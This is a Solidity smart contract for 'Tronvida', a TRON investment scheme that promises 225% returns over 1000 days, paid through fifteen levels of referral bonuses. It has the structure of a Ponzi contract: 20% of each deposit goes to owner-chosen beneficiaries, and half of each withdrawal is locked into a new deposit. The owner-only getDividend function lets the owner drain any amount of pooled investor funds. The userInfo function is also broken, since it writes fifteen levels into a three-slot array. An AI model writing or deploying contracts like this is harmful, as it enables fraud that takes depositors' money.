//SourceUnit: Tronvida.sol

// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.4.22 <0.9.0;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }
}

contract Tronvida {
    using SafeMath for uint256;

    struct Tarif {
        uint256 life_days;
        uint256 percent;
        uint256 min_inv;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        uint256 total_arc;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }

    address public owner;
    address public creator;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;

    uint256 public initialSupply = 100000000;
    uint256 public released = 0;
    uint8[] public ref_bonuses; // 1 => 1%

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(
        address indexed addr,
        address indexed from,
        uint256 amount
    );
    event Withdraw(address indexed addr, uint256 amount);

    address public beneficiary1;
    address public beneficiary2;

    constructor() {
        owner = msg.sender;
        creator = msg.sender;

        //days , total return percentage//min invest
        tarifs.push(Tarif(1000, 2250, 500000000));

        ref_bonuses.push(80);
        ref_bonuses.push(30);
        ref_bonuses.push(20);
        ref_bonuses.push(10);
        ref_bonuses.push(10);

        ref_bonuses.push(10);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);

        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        owner = _newOwner;
    }

    function setBenefeciars(address _beneficiary1, address _beneficiary2)
        public
        onlyOwner
    {
        beneficiary1 = _beneficiary1;
        beneficiary2 = _beneficiary2;
    }

    function getDividend(uint256 amount) public onlyOwner {
        payable(owner).transfer(amount);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if (payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private {
        Player storage player = players[_addr];

        for (uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time
                ? player.last_payout
                : dep.time;
            uint256 to = block.timestamp > time_end
                ? time_end
                : uint256(block.timestamp);

            if (from < to) {
                player.deposits[i].totalWithdraw +=
                    (dep.amount * (to - from) * tarif.percent) /
                    tarif.life_days /
                    8640000;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            if (up == address(0)) break;

            uint256 bonus = (_amount * ref_bonuses[i]) / 1000;

            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(
        address _addr,
        address _upline,
        uint256 _amount
    ) private {
        if (players[_addr].upline == address(0)) {
            //first time entry
            if (players[_upline].deposits.length == 0) {
                //no deposite from my upline
                _upline = creator;
            } else {
                players[_addr].direct_bonus += _amount / 200; //0.5 % direct bonus
                direct_bonus += _amount / 200;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 200);

            for (uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if (_upline == address(0)) break;
            }
        }
    }

    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found"); // ??
        require(
            msg.value >= tarifs[_tarif].min_inv,
            "Less Then the min investment"
        );
        Player storage player = players[msg.sender];

        // require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);
        player.deposits.push(
            Deposit({
                tarif: _tarif,
                amount: msg.value,
                totalWithdraw: 0,
                time: uint256(block.timestamp)
            })
        );

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        payable(beneficiary1).transfer(msg.value.mul(10).div(100));
        payable(beneficiary2).transfer(msg.value.mul(10).div(100));

        emit NewDeposit(msg.sender, msg.value, _tarif);
    }

    function withdrawDividends() external payable {
        Player storage player = players[msg.sender];
        _payout(msg.sender);

        require(player.dividends > 200000000, "200 TRX min withdraw");

        uint256 amount = player.dividends.div(2);

        player.deposits.push(
            Deposit({
                tarif: 0,
                amount: amount,
                totalWithdraw: 0,
                time: uint256(block.timestamp)
            })
        );

        player.dividends = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        player.total_arc += amount;

        payable(msg.sender).transfer(amount);
        _refPayout(msg.sender, amount);

        emit Withdraw(msg.sender, amount);
    }

    function withdrawReferral() external payable {
        Player storage player = players[msg.sender];
        _payout(msg.sender);

        require(
            player.direct_bonus > 0 || player.match_bonus > 0,
            "Zero amount"
        );

        uint256 amount = player.direct_bonus + player.match_bonus;

        player.direct_bonus = 0;
        player.match_bonus = 0;

        player.total_withdrawn += amount;
        withdrawn += amount;

        payable(msg.sender).transfer(amount);

        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) external view returns (uint256 value) {
        Player storage player = players[_addr];

        for (uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time
                ? player.last_payout
                : dep.time;
            uint256 to = block.timestamp > time_end
                ? time_end
                : uint256(block.timestamp);

            if (from < to) {
                value +=
                    (dep.amount * (to - from) * tarif.percent) /
                    tarif.life_days /
                    8640000;
            }
        }

        return value;
    }

    function userInfo(address _addr)
        external
        view
        returns (
            uint256 for_withdraw,
            uint256 withdrawable_bonus,
            uint256 total_invested,
            uint256 total_withdrawn,
            uint256 total_match_bonus,
            uint256 total_arc,
            uint256[3] memory structure
        )
    {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for (uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout +
                player.dividends +
                player.direct_bonus +
                player.match_bonus,
            player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            player.total_arc,
            structure
        );
    }

    function getStructure610(address _addr)
        external
        view
        returns (
            uint256 L6,
            uint256 L7,
            uint256 L8,
            uint256 L9,
            uint256 L10
        )
    {
        Player storage player = players[_addr];

        L6 = player.structure[5];
        L7 = player.structure[6];
        L8 = player.structure[7];
        L9 = player.structure[8];
        L10 = player.structure[9];

        return (L6, L7, L8, L9, L10);
    }

    function getStructure1115(address _addr)
        external
        view
        returns (
            uint256 L11,
            uint256 L12,
            uint256 L13,
            uint256 L14,
            uint256 L15
        )
    {
        Player storage player = players[_addr];

        L11 = player.structure[10];
        L12 = player.structure[11];
        L13 = player.structure[12];
        L14 = player.structure[13];
        L15 = player.structure[14];

        return (L11, L12, L13, L14, L15);
    }

    function getStructure(address _addr)
        external
        view
        returns (
            uint256 for_withdraw,
            uint256 withdrawable_bonus,
            uint256 total_invested,
            uint256 total_withdrawn,
            uint256 total_match_bonus,
            uint256 L1,
            uint256 L2,
            uint256 L3,
            uint256 L4,
            uint256 L5
        )
    // uint256 L6,
    // uint256 L7,
    // uint256 L8,
    // uint256 L9,
    // uint256 L10,

    // uint256 L11,
    // uint256 L12,
    // uint256 L13,
    // uint256 L14,
    // uint256 L15
    {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        L1 = player.structure[0];
        L2 = player.structure[1];
        L3 = player.structure[2];
        L4 = player.structure[3];
        L5 = player.structure[4];

        // L6 = player.structure[5];
        // L7 = player.structure[6];
        // L8 = player.structure[7];
        // L9 = player.structure[8];
        // L10 = player.structure[9];

        // L11 = player.structure[10];
        // L12 = player.structure[11];
        // L13 = player.structure[12];
        // L14 = player.structure[13];
        // L15 = player.structure[14];

        return (
            payout +
                player.dividends +
                player.direct_bonus +
                player.match_bonus,
            player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            L1,
            L2,
            L3,
            L4,
            L5
            // L6,
            // L7,
            // L8,
            // L9,
            // L10,
            // L11,
            // L12,
            // L13,
            // L14,
            // L15
        );
    }

    function contractInfo()
        external
        view
        returns (
            uint256 _invested,
            uint256 _withdrawn,
            uint256 _direct_bonus,
            uint256 _match_bonus
        )
    {
        return (invested, withdrawn, direct_bonus, match_bonus);
    }

    function investmentsInfo(address _addr)
        external
        view
        returns (
            uint8[] memory ids,
            uint256[] memory endTimes,
            uint256[] memory amounts,
            uint256[] memory totalWithdraws
        )
    {
        Player storage player = players[_addr];

        uint8[] memory _ids = new uint8[](player.deposits.length);
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](
            player.deposits.length
        );

        for (uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            _ids[i] = dep.tarif;
            _amounts[i] = dep.amount;
            _totalWithdraws[i] = dep.totalWithdraw;
            _endTimes[i] = dep.time + tarif.life_days * 86400;
        }

        return (_ids, _endTimes, _amounts, _totalWithdraws);
    }

    function seperatePayoutOf(address _addr)
        external
        view
        returns (uint256[] memory withdrawable)
    {
        Player storage player = players[_addr];
        uint256[] memory values = new uint256[](player.deposits.length);
        for (uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time
                ? player.last_payout
                : dep.time;
            uint256 to = block.timestamp > time_end
                ? time_end
                : uint256(block.timestamp);

            if (from < to) {
                values[i] =
                    (dep.amount * (to - from) * tarif.percent) /
                    tarif.life_days /
                    8640000;
            }
        }

        return values;
    }

    function updateInitialsupply(uint256 tokens) public {
        require(msg.sender == owner);
        initialSupply = tokens;
    }
}